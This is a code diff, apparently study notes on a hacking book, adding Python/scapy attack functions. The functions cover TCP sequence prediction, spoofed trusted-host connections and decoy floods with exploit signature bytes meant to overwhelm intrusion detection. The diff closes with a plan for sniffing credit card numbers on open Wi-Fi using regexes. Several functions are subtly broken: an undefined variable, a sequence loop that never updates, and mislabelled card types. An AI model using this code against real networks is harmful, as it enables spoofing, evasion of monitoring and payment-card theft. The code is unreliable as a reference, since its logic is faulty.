@@ -1523,3 +1523,149 @@ def syn_flood(src, tgt):
         TCPlayer = TCP(sport=sport, dport=513)
         pkt = IPlayer / TCPlayer
         scapy.sendrecv.send(pkt)
+
+
+# An SYN is a TCP packet requesting connection to the server. For the attack, the
+# attacker needs a TCP sequence, which he tries to get via SYN requests. Modern OS's
+# have a more random TCP sequences, but that wasn't the case during the attack. This
+# function will send SYN's and wait for SYN-ACK responses.
+
+def calc_tsn(tgt):
+    seq_num = 0
+    pre_num = 0
+    diff_seq = 0
+
+    for x in range(1, 5):
+        if pre_num != 0:
+            pre_num = seq_num
+
+        pkt = IP(dst=tgt) / TCP()
+        ans = sr1(pkt, verbose=0)
+
+        # get the TCP layer and strip out the seq number
+        seq_num = ans.getlayer(TCP).seq
+        diff_seq = seq_num - pre_num
+        print("[+] TCP Seq Diff: {}".format(diff_seq))
+
+    return seq_num + diff_seq
+
+# If there's no TCP sequence randomization, the target suffers
+# from this vulnerability. The next step is to spoof a connection
+# from the silenced server.
+
+
+def spoof_conn(src, tft, ack):
+    IPlayer = IP(src=src, dst=tgt)
+    TCPlayer = TCP(sport=513, dport=514)
+    syn_pkt = IPlayer / TCPlayer
+    send(syn_pkt)
+
+    # Acknowledgement packet
+    IPlayer = IP(src=src, dst=tgt)
+    TCPlayer = TCP(sport=513, dport=514)
+    ack_pkt = IPlayer / TCPlayer
+    send(ack_pkt)
+
+# Network based intrusion detection systems can log packets
+# and network traffic real time. What if you send out many
+# different attacks to overwhelm the analyst? For cetain
+# attacks, we craft certain packets with different contents.
+
+# Crafting 4 packets with 4 different types of attacks
+
+
+def ddos_test(src, dst, iface, count):
+    pkt = IP(src=src, dst=dst)/ICMP(type=8, id=678)/Raw(load='1234')
+    send(pkt, iface=iface, count=count)
+    pkt = IP(src=src, dst=dst)/ICMP(type=0)/Raw(load='AAAAAAAAAA')
+    send(pkt, iface=iface, count=count)
+    pkt = IP(src=src, dst=dst)/UDP(dport=31335)/Raw(load='P0NG')
+    send(pkt, iface=iface, count=count)
+    pkt = IP(src=src, dst=dst)/ICMP(type=0, id=678)
+    send(pkt, iface=iface, count=count)
+
+# For a different attack AKA the ntalkd x86 Linux overflow and the
+# Linux mountd overflow, we require crafting bytes into the attack
+# load.
+
+
+def exploit_test(src, dst, iface, count):
+    pkt = IP(src=src, dst=dst)/UDP(dport=518) \
+        / Raw(load='"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
+    send(pkt, iface=iface, count=count)
+    pkt = IP(src=src, dst=dst)/ICMP(type=0)\
+        / Raw(load='^\xB0\x02\x89\x06\xFE\xC8\x89\x04\xB0\x06\x89F')
+    send(pkt, iface=iface, count=count)
+
+
+def scan_test(src, dst, iface, count):
+    pkt = IP(src=src, dst=dst) / UDP(dport=7) \
+        / Raw(load='Amanda')
+    send(pkt, iface=iface, count=count)
+
+#####################################################################
+# Chapter 5
+#####################################################################
+
+# This wireless attack requires some hardware, so it'll be ignored, but
+# I will list out what exactly this does. There's a wireless network
+# adapter in use which sends raw 802.11 frames. To place the card into
+# listening mode, use the aircrack-ng suite. For each packet encountered,
+# we'll run this function below.
+
+
+def print_pkt(pkt):
+    if pkt.haslayer(Dot11Beacon):
+        print("[+] Detected 802.11 Beacon Frame")
+    elif pkt.haslayer(Dot11ProbeReq):
+        print("[+] Detected 802.11 Probe Request Frame")
+    elif pkt.haslayer(TCP):
+        print("[+] Detected a TCP packet")
+    elif pkt.haslayer(DNS):
+        print("[+] Detected a DNS packet")
+
+# Python can be used to attack Bluetooth as well. We can use the
+# Bluez API and the obexftp API. Let's do a quick regex review
+# for credit cards.
+#
+# . - any character
+# [ab] - match or b
+# [0-9] = match any digit
+# ^ - start of string
+# * - 0 or more
+# + - 1 or more repititions
+# ? - 0 or 1 repititions
+# {n} - n copies of previous regex
+
+# Let's write regexes for visa, mastercard, and american express.
+
+
+def find_american_express(raw):
+    americaRE = re.findall("3[47][0-9]{13}", raw)
+    if americaRE:
+        print("[+] Found American Express Card: {}".format(americaRE[0]))
+
+
+def find_master_card(raw):
+    masterRE = re.findall("5[1-5][0-9]{14}", raw)
+    if masterRE:
+        print("[+] Found American Express Card: {}".format(masterRE[0]))
+
+
+def find_visa_card(raw):
+    # start with 4 + 12 digits and accept 0 or 1 cases of 3 or more digits
+    visaRE = re.findall("4[0-9]{12}(?:[0-9]{3})?", raw)
+    if visaRE:
+        print("[+] Found American Express Card: {}".format(visaRE[0]))
+
+# How the credit card sniffer works is to set the card in monitor mode,
+# sniff the wireless packets, and check for these regexes.
+# For the scapy side of things, you can call the sniff function, with a
+# tcp filter i.e. sniff(filter='tcp', prn=function, store=0)
+
+# There are many unencrypted wireless networks in airports, hotels,
+# cafes, etc. This can be exploited. The example given in the book is
+# awesome: the hotel in question took last name and room number as
+# authentication for WiFi AND for meals, drinks, cigars, and, well,
+# you name it. This information can be sniffed out as other guests try
+# to log into this WiFi.
